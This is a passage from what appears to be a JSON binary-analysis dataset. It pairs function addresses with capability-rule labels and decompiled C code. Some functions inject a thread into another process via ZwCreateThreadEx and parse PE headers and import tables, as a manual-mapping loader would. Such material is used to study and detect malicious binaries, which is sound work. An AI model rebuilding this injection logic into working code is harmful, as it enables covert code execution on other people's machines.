(*_sym.imp.ntdll.dll_ZwClose)(iVar5);\n                }\n            }\n        }\n        return uVar3;\n    }\n    var_10h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x2002d44c, \"ZwCreateThreadEx\");\n    pcVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    if (pcVar1 == NULL) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        return uVar3;\n    }\n    var_28h = &var_10h;\n    var_18h = &var_4h;\n    puVar6 = param_1 + 0x4b;\n    var_34h = 0x24;\n    var_30h = 0x10003;\n    s = 8;\n    var_24h = 0;\n    var_20h = 0x10004;\n    var_1ch = 4;\n    var_14h = 0;\n    uVar3 = (*pcVar1)(puVar6, 0x1fffff, 0, *(param_1 + 0x1b), *(param_1 + 0x23), *(param_1 + 0x33), 0, 0, 0, 0, &var_34h\n                     );\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar6, 0xffffffff);\n    if (uVar3 == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar6, &lpThreadAttributes);\n        if (iVar5 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            if (lpThreadAttributes == 0x1) {\n                uVar3 = 0;\n                goto code_r0x2000dac5;\n            }\n            uVar3 = 0xc0000001;\n        }\n        if (uVar3 == 0) goto code_r0x2000dac5;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateThread)(*puVar6, 0);\ncode_r0x2000dac5:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*puVar6);\n    return uVar3;\n}\n",
        "token_count": 1200
    },
    "2001127d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.2001127d(void)\n\n{\n    uint *arg_10h;\n    uint uVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    code **unaff_ESI;\n    uint unaff_EDI;\n    char *var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = unaff_EBX >> 0x18;\n    arg_10h = unaff_ESI + 0xf;\n    var_10h = 0x2002d92c;\n    var_ch = arg_10h;\n    var_8h = unaff_EDI;\n    iVar2 = fcn.2001057d(*(unaff_ESI + 0x17), 0x2002d92c, arg_10h);\n    if (iVar2 == 0) {\n        if ((*(unaff_ESI + 99) != 0) && (*(unaff_ESI + 0x6f) == 0)) {\n            var_ch = unaff_ESI + 0x9f;\n            var_10h = \"LdrGetProcedureAddress\";\n            iVar2 = fcn.20010fa9(*(unaff_ESI + 0x17), *arg_10h, \"LdrGetProcedureAddress\", var_ch);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n        var_ch = 0x200112c6;\n        iVar2 = fcn.2000d8cc();\n        uVar1 = var_8h;\n        if (*(unaff_ESI + 0x17) != iVar2) {\n            var_8h = 0;\n            iVar2 = fcn.2000d9af(&fcn.2001127d::var_ch, 0x47a, *(unaff_ESI + 0x17), uVar1);\n            if ((iVar2 == 0) && (iVar2 = fcn.2000d881(var_ch, &fcn.2001127d::var_1h),  iVar2 == 0)) {\n                *(unaff_ESI + 3) = var_1h;\n                *(unaff_ESI + 0x1b) = var_ch;\n                *(unaff_ESI + 0x1f) = 0;\n                *(unaff_ESI + 0x2b) = 1;\n                if (var_1h == '\\0') {\n                    iVar2 = 0x21590064;\n                }\n                else {\n                    var_10h = 0x24c;\n                    iVar2 = fcn.2000d921(var_ch, &fcn.2001127d::var_8h, &fcn.2001127d::var_10h);\n                    if ((iVar2 == 0) && (iVar2 = fcn.2000d909(var_ch, var_8h, 0, 0x20034d10, 0xfe),  iVar2 == 0)) {\n                        *(unaff_ESI + 0x23) = var_8h;\n                        *(unaff_ESI + 0x27) = 0;\n                        iVar2 = fcn.200110f4();\n                        if ((iVar2 == 0) &&\n                           (iVar2 = fcn.2000d909(var_ch, var_8h + 0x1a5, 0xfffffe5a < var_8h),  iVar2 == 0)) {\n                            *(unaff_ESI + 0x33) = var_8h + 0x1a5;\n                            *(unaff_ESI + 0x37) = 0;\n                            iVar2 = fcn.2001113a();\n                        }\n                    }\n                }\n            }\n            if ((var_8h != 0) && (*(unaff_ESI + 0x2b) != 0)) {\n                var_10h = NULL;\n                (*_sym.imp.ntdll.dll_ZwFreeVirtualMemory)(var_ch, &fcn.2001127d::var_8h, &fcn.2001127d::var_10h, 0x8000)\n                ;\n            }\n            (*_sym.imp.ntdll.dll_ZwClose)(var_ch);\n            return iVar2;\n        }\n        if (*(unaff_ESI + 99) == 0) {\n            var_ch = *(unaff_ESI + 0x6f);\n            var_10h = *(unaff_ESI + 0x67);\n            iVar2 = (**unaff_ESI)();\n        }\n        else {\n            var_ch = NULL;\n            var_10h = *(unaff_ESI + 0x6f);\n            iVar2 = (**unaff_ESI)(*(unaff_ESI + 0x67));\n            iVar2 = (iVar2 != 0) - 1;\n            if (*(unaff_ESI + 0x6f) == 0) {\n                (**(unaff_ESI + 0x9f))(*arg_10h, 0, 0xffff, &fcn.2001127d::var_ch);\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 1215
    },
    "2001138b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.2001138b(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_15ch;\n    uint var_134h;\n    uint var_64h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x200324d8, 0x14c);\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = 0;\n    iVar3 = piVar1[1];\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x1c) = 0x21590065;\n        goto code_r0x2001151c;\n    }\n    arg_8h_00 = *piVar1;\n    if (arg_8h_00 == 0) {\n        *(unaff_EBP + -0x1c) = 0;\n        goto code_r0x2001151c;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar3 = fcn.2000f1b4(arg_8h_00, iVar3, unaff_EBP + -0x24);\n    *(unaff_EBP + -0x1c) = iVar3;\n    if (iVar3 == 0) {\n        uVar2 = *(unaff_EBP + -0x24);\n        if (uVar2 != 0) {\n            if (uVar2 == 0xffffffff) {\ncode_r0x200113f7:\n                *(unaff_EBP + -0x1c) = 0;\n            }\n            else if (uVar2 == 0) {\ncode_r0x2001141a:\n                if (1 < uVar2) goto code_r0x200113f7;\n                iVar3 = fcn.2000d9af(unaff_EBP + -0x20, 0x18, *piVar1);\n                *(unaff_EBP + -0x1c) = iVar3;\n                if (iVar3 == 0) {\n                    iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x20), piVar1[1], 0, unaff_EBP + -100, 0x40);\n                    *(unaff_EBP + -0x1c) = iVar3;\n                    if (iVar3 == 0) {\n                        if (*(unaff_EBP + -100) == 0x5a4d) {\n                            uVar2 = *(unaff_EBP + -0x28);\n                            iVar3 = fcn.2000d8f1(*(unaff_EBP + -0x20), uVar2 + piVar1[1], \n                                                 (uVar2 >> 0x1f) + CARRY4(uVar2, piVar1[1]), unaff_EBP + -0x15c, 0xf8);\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            if (iVar3 == 0) {\n                                if (*(unaff_EBP + -0x15c) != 0x4550) goto code_r0x2001145b;\n                                (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + -0x20));\n                                *(unaff_EBP + -0x20) = 0;\n                                if ((*(piVar1 + 2) != '\\0') && (*(unaff_EBP + -0x134) != 0)) {\n                                    iVar3 = fcn.2001131c(*piVar1, piVar1[1] + *(unaff_EBP + -0x134), piVar1[1], 0);\n                                    *(unaff_EBP + -0x1c) = iVar3;\n                                    if (iVar3 != 0) goto code_r0x200113fb;\n                                }\n                                iVar3 = fcn.2000f925(*piVar1, piVar1[1]);\n                                *(unaff_EBP + -0x1c) = iVar3;\n                                if (iVar3 == 0) {\n                                    uVar4 = fcn.2001156d(*piVar1, unaff_EBP + -0x15c, piVar1[1]);\n                                    *(unaff_EBP + -0x1c) = uVar4;\n                                }\n                            }\n                        }\n                        else {\ncode_r0x2001145b:\n                            *(unaff_EBP + -0x1c) = 0xffffffff;\n                        }\n                    }\n                }\n            }\n            else {\n                iVar3 = fcn.2000fded(*piVar1, piVar1[1]);\n                *(unaff_EBP + -0x1c) = iVar3;\n                if (iVar3 == 0) goto code_r0x2001141a;\n            }\ncode_r0x200113fb:\n            *(unaff_EBP + -4) = 0xffffffff;\n            goto code_r0x2001151c;\n        }\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x2001151c:\n    if (*(unaff_EBP + -0x20) != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + -0x20));\n    }\n    piVar1[3] = *(unaff_EBP + -0x1c);\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 1302
    },
    "2001156d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.2001156d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t arg_ch_00;\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint32_t uVar3;\n    uint var_140h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x200324e8, 0x130);\n    *(unaff_EBP + -0x20) = 0;\n    *(unaff_EBP + -4) = 0;\n    arg_ch_00 = *(unaff_EBP + 0x10);\n    uVar3 = *(*(unaff_EBP + 0xc) + 0x80) + arg_ch_00;\n    *(unaff_EBP + -0x28) = uVar3;\n    if (uVar3 == arg_ch_00) {\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    else {\n        arg_8h_00 = *(unaff_EBP + 8);\n        iVar2 = fcn.2000d9af(unaff_EBP + -0x20, 0x18, arg_8h_00);\n        *(unaff_EBP + -0x1c) = iVar2;\n        if (iVar2 == 0) {\n            while( true ) {\n                iVar2 = fcn.2000d8f1(*(unaff_EBP + -0x20), uVar3, 0, unaff_EBP + -0x3c, 0x14);\n                *(unaff_EBP + -0x1c) = iVar2;\n                if (iVar2 != 0) break;\n                uVar1 = *(unaff_EBP + -0x30);\n                if (uVar1 == 0) {\n                    fcn.2000d98f(*(unaff_EBP + -0x20), arg_ch_00);\n                    *(unaff_EBP + -0x1c) = 0;\n                    break;\n                }\n                iVar2 = fcn.2000d8f1(*(unaff_EBP + -0x20), uVar1 + arg_ch_00, CARRY4(uVar1, arg_ch_00), \n                                     unaff_EBP + -0x140, 0x104);\n                *(unaff_EBP + -0x1c) = iVar2;\n                if (iVar2 != 0) break;\n                if (*(unaff_EBP + -0x140) != '\\0') {\n                    iVar2 = fcn.200109d5(arg_8h_00, unaff_EBP + -0x140, unaff_EBP + -0x24);\n                    *(unaff_EBP + -0x1c) = iVar2;\n                    if (iVar2 == 0) {\n                        fcn.2000fded(arg_8h_00, *(unaff_EBP + -0x24));\n                        fcn.20011537(arg_8h_00, *(unaff_EBP + -0x24), 1);\n                    }\n                    uVar3 = uVar3 + 0x14;\n                    *(unaff_EBP + -0x28) = uVar3;\n                }\n            }\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x20) != 0) {\n        (*_sym.imp.ntdll.dll_ZwClose)(*(unaff_EBP + -0x20));\n    }\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 870
    },
    "200116e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.200116e4(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar2 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar1 = *(param_2 + 8);\n        for (iVar3 = *(param_2 + 0xc); iVar3 != -1; iVar3 = *(iVar1 + iVar3 * 0xc)) {\n            if (*(iVar1 + 4 + iVar3 * 0xc) != 0) {\n                iVar1 = (**(iVar1 + 4 + iVar3 * 0xc))();\n                param_2 = *(puVar2 + 0xc);\n                if (iVar1 != 0) {\n                    if (iVar1 < 0) {\n                        return 0;\n                    }\n                    iVar1 = *(param_2 + 8);\n                    fcn.200117b4(param_2);\n                    puVar2 = param_2 + 0x10;\n                    fcn.200117f6(param_2, iVar3);\n                    *(param_2 + 0xc) = *(iVar1 + iVar3 * 0xc);\n                    (**(iVar1 + 8 + iVar3 * 0xc))();\n                }\n            }\n            iVar1 = *(param_2 + 8);\n        }\n    }\n    else {\n        fcn.200117f6(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 410
    },
    "200117f6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.200117f6(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iStack16 = param_1;\n    uStack24 = 0x200117d4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    while( true ) {\n        iVar1 = *(param_1 + 8);\n        iVar2 = *(param_1 + 0xc);\n        if ((iVar2 == -1) || (iVar2 == param_2)) break;\n        uStack20 = *(iVar1 + iVar2 * 0xc);\n        *(param_1 + 0xc) = uStack20;\n        if (*(iVar1 + 4 + iVar2 * 0xc) == 0) {\n            (**(iVar1 + 8 + iVar2 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 253
    },
    "200118f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.200118f3(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t **unaff_EDI;\n    int32_t var_ch;\n    uchar *var_8h;\n    int32_t ptr;\n    \n    *unaff_EDI = NULL;\n    iVar1 = *arg_8h;\n    var_ch = 0;\n    piVar3 = arg_8h;\n    do {\n        if (iVar1 == 0) {\n            return 0x21590005;\n        }\n        iVar1 = (*_sym.imp.msvcrt.dll__strdup)(*piVar3);\n        if (iVar1 == 0) {\n            return 0x21590004;\n        }\n        var_8h = (*_sym.imp.ntdll.dll_strchr)(iVar1, 0x2e);\n        if (var_8h != NULL) {\n            *var_8h = 0;\n            var_8h = var_8h + 1;\n        }\n        iVar2 = fcn.20012fd0(iVar1, arg_1ch);\n        if (iVar2 == 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n            if (*0x200464ec != 0) {\n                if (arg_20h == 0) {\n                    ptr = (**(*0x200464ec + 0xc))();\n                }\n                else {\n                    ptr = (**(*0x200464ec + 0x10))();\n                }\n                iVar2 = *0x200464ec;\n                if (ptr == 0) goto code_r0x200119f5;\n            }\n        }\n        else {\n            if (var_8h == NULL) {\n                sub.ntdll.dll_strlen(iVar1);\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n            if (arg_20h == 0) {\n                ptr = (**(iVar2 + 0xc))();\n            }\n            else {\n                ptr = (**(iVar2 + 0x10))();\n            }\ncode_r0x200119f5:\n            if (iVar2 != 0) {\n                if (ptr != 0) {\n                    return ptr;\n                }\n                if (*unaff_EDI != NULL) {\n                    piVar3 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n                    if (piVar3 == NULL) {\n                        (**(iVar2 + 0x14))(*unaff_EDI, 0);\n                        (**(iVar2 + 0x18))(*unaff_EDI, 0);\n                        *unaff_EDI = NULL;\n                    }\n                    else {\n                        *piVar3 = iVar2;\n                        piVar3[1] = 0;\n                        piVar3[2] = 0;\n                        piVar3[3] = 1;\n                        **unaff_EDI = piVar3;\n                        iVar1 = fcn.2001396b(*unaff_EDI, 4);\n                        if (iVar1 != 0) {\n                            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(0x20046e94);\n                            return 0;\n                        }\n                        (*_sym.imp.msvcrt.dll_free)(piVar3);\n                        (**(iVar2 + 0x14))(*unaff_EDI, 0);\n                        (**(iVar2 + 0x18))(*unaff_EDI, 0);\n                        *unaff_EDI = NULL;\n                    }\n                    return 0x21590004;\n                }\n                (**(iVar2 + 0x14))(0, 0);\n                (**(iVar2 + 0x18))(*unaff_EDI, 0);\n                return -1;\n            }\n        }\n        var_ch = var_ch + 1;\n        piVar3 = arg_8h + var_ch;\n        iVar1 = *piVar3;\n    } while( true );\n}\n",
        "token_count": 904
    },
    "20011aba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20011aba(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t **unaff_EDI;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedDecrement;\n    piVar2 = *unaff_EDI;\n    piVar1 = piVar2 + 3;\n    if ((0 < *piVar1) && (iVar4 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(piVar1),  iVar4 == 0)) {\n        fcn.200139c9(unaff_EDI, 4);\n        (**(**unaff_EDI + 0x18))();\n        (*_sym.imp.msvcrt.dll_free)(piVar2);\n        (*pcVar3)(0x20046e94);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "20011b43": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20011b43(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    ppiVar1 = *param_1;\n    fcn.20001567(0x20046e98);\n    iVar3 = fcn.20013a3e(ppiVar1, 4);\n    if ((iVar3 == 0) || (piVar2 = *ppiVar1,  piVar2[1] != 0)) {\n        fcn.2000157d(0x20046e98);\n    }\n    else {\n        piVar2[2] = param_2;\n        piVar2[1] = 1;\n        fcn.2000157d(0x20046e98);\n        (**(**ppiVar1 + 0x14))(ppiVar1, param_2);\n        fcn.20011aba();\n    }\n    *param_1 = NULL;\n    return;\n}\n",
        "token_count": 230
    },
    "20011ba5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.20011ba5(int32_t **param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.20013a3e(param_1, 4);\n    if ((iVar1 != 0) && (param_2 != 0)) {\n        (**(**param_1 + 0x30))(param_1, param_2);\n        fcn.20011aba();\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "20011bd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.20011bd4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    fcn.20001567(0x20046e98);\n    iVar1 = fcn.20013a3e();\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (*(*in_EAX + 4) == 0) {\n        fcn.200228fc();\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    fcn.2000157d(0x20046e98);\n    return uVar2;\n}\n",
        "token_count": 162
    },
    "20011c1d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20011c1d(int32_t **param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x1d) || (pcVar1 = (**param_1)[7],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2, param_3);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20011aba();\n    }\n    return iVar2;\n}\n",
        "token_count": 193
    },
    "20011d47": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20011d47(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x29) || (pcVar1 = (**arg_8h)[10],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20011aba();\n    }\n    return iVar2;\n}\n",
        "token_count": 220
    },
    "20011da3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20011da3(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x2d) || (pcVar1 = (**arg_8h)[0xb],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20011aba();\n    }\n    return iVar2;\n}\n",
        "token_count": 222
    },
    "20011dff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20011dff(int32_t **param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***param_1 < 0x35) || (pcVar1 = (**param_1)[0xd],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(param_1, param_2, param_3, param_4);\n            if ((iVar2 != 0) && ((*param_1)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20011aba();\n    }\n    return iVar2;\n}\n",
        "token_count": 200
    },
    "20011e58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20011e58(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t var_4h;\n    \n    var_4h = fcn.20011bd4();\n    if (var_4h == 0) {\n        if ((***arg_8h < 0x39) || (pcVar1 = (**arg_8h)[0xe],  pcVar1 == NULL)) {\n            fcn.20011aba();\n            var_4h = 0x21590001;\n        }\n        else {\n            var_4h = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) || (*arg_ch == 0)) {\n                if ((*arg_8h)[1] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.20011aba();\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 279
    },
    "20011ecc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.20011ecc(void)\n\n{\n    code *pcVar1;\n    int32_t **in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***in_EAX < 0x3d) || (pcVar1 = (**in_EAX)[0xf],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)();\n            if ((iVar2 != 0) && ((*in_EAX)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20011aba();\n    }\n    return iVar2;\n}\n",
        "token_count": 173
    },
    "20011f1d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20011f1d(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.20011bd4();\n    if (iVar2 == 0) {\n        if ((***arg_8h < 0x41) || (pcVar1 = (**arg_8h)[0x10],  pcVar1 == NULL)) {\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((iVar2 != 0) && ((*arg_8h)[1] != 0)) {\n                iVar2 = 0x21590006;\n            }\n        }\n        fcn.20011aba();\n    }\n    return iVar2;\n}\n",
        "token_count": 223
    },
    "20011f79": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
